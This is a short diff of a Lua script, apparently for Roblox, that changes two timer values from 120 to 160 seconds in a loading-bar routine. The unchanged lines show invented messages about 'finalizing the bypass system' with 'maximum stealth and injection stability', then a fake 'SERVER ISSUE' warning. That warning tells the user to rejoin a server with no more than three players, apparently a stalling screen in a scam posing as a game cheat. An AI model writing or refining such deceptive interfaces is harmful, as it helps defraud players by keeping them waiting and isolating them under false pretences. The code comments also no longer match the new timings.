@@ -167,7 +167,7 @@ end
 
 -- Loading Bar Animation (120 seconds)
 local function animateLoadingBar()
-    local tweenInfo = TweenInfo.new(120, Enum.EasingStyle.Linear) 
+    local tweenInfo = TweenInfo.new(160, Enum.EasingStyle.Linear) 
     local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
     tween:Play()
 
@@ -176,7 +176,7 @@ local function animateLoadingBar()
         mainText.Text = "Please wait 3–5 minutes while we finalize the bypass system..."
         waitText.Text = "Ensuring maximum stealth and injection stability."
 
-        task.delay(120, function() -- After another 2 minutes (5 total) 
+        task.delay(160, function() -- After another 2 minutes (5 total) 
             mainText.Text = "⚠️ SERVER ISSUE DETECTED"
             waitText.Text = "Please rejoin a different server with fewer players.\nAvoid servers with more than 3 people to prevent bugs."
         end)
